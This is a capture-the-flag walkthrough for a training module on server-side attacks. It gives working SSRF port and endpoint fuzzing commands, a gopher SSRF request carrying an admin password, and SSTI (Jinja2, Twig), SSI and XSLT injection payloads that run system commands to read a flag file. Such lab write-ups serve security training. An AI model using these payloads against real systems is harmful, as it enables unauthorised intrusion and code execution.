# Server-Side Attacks

## Question

**exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag.**

### Answer

**Generate port list**

```bash
# Generate a list of ports from 1 to 10000
seq 1 10000 > ports.txt
```

**Fuzz internal ports via SSRF**

```bash
# Fuzz localhost ports through the vulnerable dateserver parameter
ffuf -w ports.txt \
-u http://SERVER_IP/index.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
-fr "Failed to connect to"
```

**Confirm in Burp Repeater**

```text
# Manually test the discovered open port
dateserver=http://127.0.0.1:8000&date=2024-01-01
```

**Result**

* Internal web application discovered
* Flag obtained ✅

---

## Question

**exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag. Feel free to play around with all SSRF exploitation techniques discussed in this section.**

### Answer

**Endpoint discovery via SSRF**

```bash
# Fuzz endpoints on the internal dateserver virtual host
ffuf -u http://SERVER_IP/index.php \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
-fr "Server at dateserver.htb Port 80"
```

**Discovered endpoint**

```
admin.php
```

**Access admin endpoint**

```text
# Direct SSRF request to admin endpoint
dateserver=http://dateserver.htb/admin.php&date=2024-01-01
```

**Result**

* Flag obtained ✅

---

### Alternative Method (Gopher SSRF)

```text
# Use gopher protocol to craft a raw HTTP POST request
dateserver=gopher%3a//dateserver.htb%3a80POST%20/admin.php%20HTTP/1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw=admin
```

**Result**

* Flag obtained via authenticated request

---

## Question

**Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?**

### Answer

**Port fuzzing via SSRF**

```bash
# Identify open ports by observing response behavior
ffuf -u http://SERVER_IP/index.php \
-w port.txt \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "dateserver=http://127.0.0.1:FUZZ/index.html&date=2024-01-01" \
-mr "Date is unavailable"
```

**Result**

* Additional open port identified ✅

---

## Question

**Exploit the SSTI vulnerability to obtain RCE and read the flag.(Jinja2)**

### Answer

**Test command execution**

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

**Read flag**

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

**Result**

* Flag displayed ✅

---

## Question

**Exploit the SSTI vulnerability to obtain RCE and read the flag. (Twig)**

```jinja
{{ ['cat ../../../flag.txt'] | filter('system') }}
```

### Answer

* Payload executes system command
* Flag successfully read via SSTI filter abuse ✅

---

## Question

**Exploit the SSI Injection vulnerability to obtain RCE and read the flag.**

### Answer

**SSI payload**

```html
<!--#exec cmd="cat ../../../flag.txt" -->
```

**Result**

* Server-side include executed
* Flag obtained ✅

---

## Question

**exploit the XSLT Injection vulnerability to obtain RCE and read the flag.**

### Answer

**XSLT payload**

```xml
<xsl:value-of select="php:function('system','cat ../../../flag.txt')" />
```

**Result**

* PHP function executed
* Flag retrieved ✅

---

## Question

**Apply what you have learned in this module to obtain the flag.**

### Answer

**Recon**

```text
# Inspect HTTP history in Burp
api=http://truckapi.htb/?id=FusionExpress01
```

**Confirm SSTI**

```text
# Test template evaluation
api=http://truckapi.htb/?id={{7*7}}
```

**Result**

```
49 → Twig SSTI confirmed
```

**Execute system command**

```text
api=http://truckapi.htb/?id={{['id']|filter('system')}}
```

**Read flag**

```text
api=http://truckapi.htb/?id%3D{{['cat\x20../../../flag.txt']|filter('system')}}
```

**Result**

* Flag obtained ✅

---